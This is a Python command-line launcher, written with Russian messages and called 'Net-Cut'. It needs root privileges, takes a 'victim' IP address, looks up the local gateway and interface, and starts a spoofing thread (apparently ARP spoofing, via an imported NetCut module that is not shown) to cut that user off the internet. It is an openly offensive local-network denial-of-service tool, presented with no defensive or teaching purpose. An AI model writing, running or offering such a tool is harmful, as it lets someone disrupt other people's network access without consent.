#!/usr/bin/env python3

import os

if "SUDO_COMMAND" not in os.environ.keys():
    print("Данная программа треубет прав супер пользователя")
    exit()


import argparse

parser = argparse.ArgumentParser(prog="Net-Cut", description="С помощью данной консольной утилиты вы можете отключить интернет пользователю, зная его локальный IP адрес")
parser.add_argument("ip", metavar='ip', help="IP пользователя, которого нужно отключить от сети")
parser.add_argument("-w", "--waiting", help="Ждать ли пользователя, после его отключения от сети (по умолчанию: нет)", action='store_true')

args = parser.parse_args()

victim_ip = args.ip
is_waiting = args.waiting



from threading import Thread
import netifaces
from scapy.all import inet_aton

from net_cut import NetCut


try:
    inet_aton(victim_ip)
except OSError:
    print("Не правильный IP адрес")
    exit()


gws = netifaces.gateways()

route_ip = gws["default"][2][0]
active_interface = gws["default"][2][1]
local_ip = netifaces.ifaddresses(active_interface)[2][0]['addr']


nct = NetCut(local_ip, victim_ip, route_ip, is_waiting)

print("[*] Начинаю спуфить")
Thread(target=nct.spoof).start()

print("[*] Отключаю интернет")
nct.queue_run()
